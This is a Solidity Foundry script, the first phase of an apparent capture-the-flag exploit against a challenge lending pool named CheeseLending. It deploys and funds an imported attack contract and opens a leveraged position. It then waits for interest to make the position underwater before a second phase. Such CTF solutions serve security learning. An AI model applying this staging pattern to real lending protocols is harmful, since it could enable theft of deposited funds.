// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import {CheeseLending} from "targets/cheese_lending/src/CheeseLending.sol";
import {Cheese} from "targets/cheese_lending/src/Cheese.sol";
import {CheeseAttack} from "src/cheese_lending/CheeseAttack.sol";

/// @title Cheese Lending — Phase 1
/// @notice Deploys the attack contract, funds it from the player EOA, opens the
///         position (supply 9.8 gruy + borrow 4.5 emm). Then WAIT ~1000 seconds
///         of wall-clock time before running Phase2. The gap is needed for
///         interest accrual to flip the position underwater.
///
/// Required env:
///   CHALLENGE   — address of the deployed CheeseLending (the challenge target)
contract Phase1 is Script {
    function run() external {
        address pool_ = vm.envAddress("CHALLENGE");
        CheeseLending pool = CheeseLending(pool_);
        Cheese gruy = Cheese(pool.assets(0)); // _initReserve(gruyere, 1) registered at index 0
        Cheese emm  = Cheese(pool.assets(1)); // _initReserve(emmental, 2) registered at index 1

        vm.startBroadcast();

        CheeseAttack attack = new CheeseAttack(pool, gruy, emm);
        gruy.transfer(address(attack), 10 ether);
        emm.transfer(address(attack), 10 ether);

        attack.openPosition(9.8 ether, 4.5 ether);

        vm.stopBroadcast();

        console.log("Phase1 done. Attack contract:", address(attack));
        console.log("Wait >=1000 seconds, then run Phase2 with ATTACK=<addr>");
    }
}
